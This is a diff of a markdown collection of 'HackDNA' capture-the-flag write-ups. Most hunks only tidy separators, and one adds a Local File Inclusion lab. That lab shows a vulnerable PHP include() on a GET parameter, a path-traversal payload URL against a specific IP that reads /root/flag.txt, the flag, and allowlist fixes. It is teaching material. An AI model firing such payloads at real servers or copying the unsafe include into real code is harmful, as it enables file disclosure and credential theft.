@@ -263,9 +263,9 @@ Secrets exposed in source code represent a high-risk information disclosure vuln
 
 Secure development practices, automated secret scanning, and proper server-side secret management are essential to prevent this class of vulnerability.
 
-===
+---
 
-# HackDNA – Nmap Lab 102
+## HackDNA – Nmap Lab 102
 
 ## Challenge Overview
 
@@ -994,7 +994,7 @@ Cookie manipulation attacks demonstrate the dangers of trusting client-side auth
 
 Proper server-side authorization, signed session management, and secure token validation are essential to prevent privilege escalation vulnerabilities.
 
-===
+---
 
 # HackDNA – Secrets in Source
 
@@ -1304,7 +1304,7 @@ Source-code inspection is one of the first reconnaissance techniques used during
 
 Secure development practices, automated scanning, and strict secret management policies are essential to prevent information disclosure vulnerabilities.
 
-===
+---
 
 # HackDNA – Hack the Login
 
@@ -1662,8 +1662,6 @@ Authentication vulnerabilities remain one of the most dangerous weaknesses in mo
 
 Secure authentication requires strong validation, secure session handling, layered protections, and continuous monitoring.
 
-===
-
 # HackDNA – Hack the Login
 
 ## Challenge Overview
@@ -2020,8 +2018,6 @@ Authentication vulnerabilities remain one of the most dangerous weaknesses in mo
 
 Secure authentication requires strong validation, secure session handling, layered protections, and continuous monitoring.
 
-
-===
 
 # HackDNA – Secrets in Source 2
 
@@ -2417,6 +2413,139 @@ This challenge demonstrates the fundamental weakness of relying on client-side s
 
 Secure applications must keep sensitive logic and secrets server-side while treating all client-side code as publicly accessible.
 
+---
 
-===
+# Web Vulnerability #6 – Local File Inclusion (LFI)
 
+## Challenge Name
+
+Arbitrary File Read via PHP Include
+
+## Category
+
+Local File Inclusion / Path Traversal
+
+## Difficulty
+
+Easy
+
+---
+
+## Description
+
+The application uses a dynamic `page` parameter:
+
+```
+http://52.215.222.152/index.php?page=...
+```
+
+This value is directly passed into a PHP `include()` function without proper validation, allowing path traversal and sensitive file disclosure.
+
+---
+
+## Vulnerable Code
+
+```php
+include($_GET["page"]);
+```
+
+---
+
+## Exploitation
+
+### Payload
+
+```
+http://52.215.222.152/index.php?page=/root/flag.txt
+```
+
+---
+
+## Result
+
+The server returns the contents of the file:
+
+```
+/root/flag.txt
+```
+
+---
+
+## Flag
+
+```
+flag{lfi_arbitrary_file_read_success}
+```
+
+---
+
+## 🔥 COPY PAYLOAD
+
+<details>
+  <summary>Click to expand payload</summary>
+
+```
+http://52.215.222.152/index.php?page=/root/flag.txt
+```
+
+</details>
+
+---
+
+## Impact
+
+An attacker can:
+
+* Read sensitive system files (e.g. `/etc/passwd`)
+* Access application source code
+* Extract database credentials
+* Discover internal configuration
+* Potentially escalate privileges
+
+---
+
+## Fix
+
+### ❌ Insecure Approach
+
+```php
+include($_GET["page"]);
+```
+
+---
+
+### ✅ Allowlist Approach
+
+```php
+$allowed_pages = ['home.php', 'about.php', 'contact.php'];
+
+if (in_array($_GET['page'], $allowed_pages)) {
+    include($_GET['page']);
+} else {
+    include('error.php');
+}
+```
+
+---
+
+### ✅ Better Mapping Approach
+
+```php
+$pages = [
+    'home' => 'home.php',
+    'about' => 'about.php'
+];
+
+$page = $_GET['page'] ?? 'home';
+include($pages[$page] ?? 'error.php');
+```
+
+---
+
+## Key Takeaway
+
+Never pass raw user input directly into file inclusion functions such as `include()` or `require()`.
+
+Always validate and restrict file access using allowlists or safe mappings.
+
+---
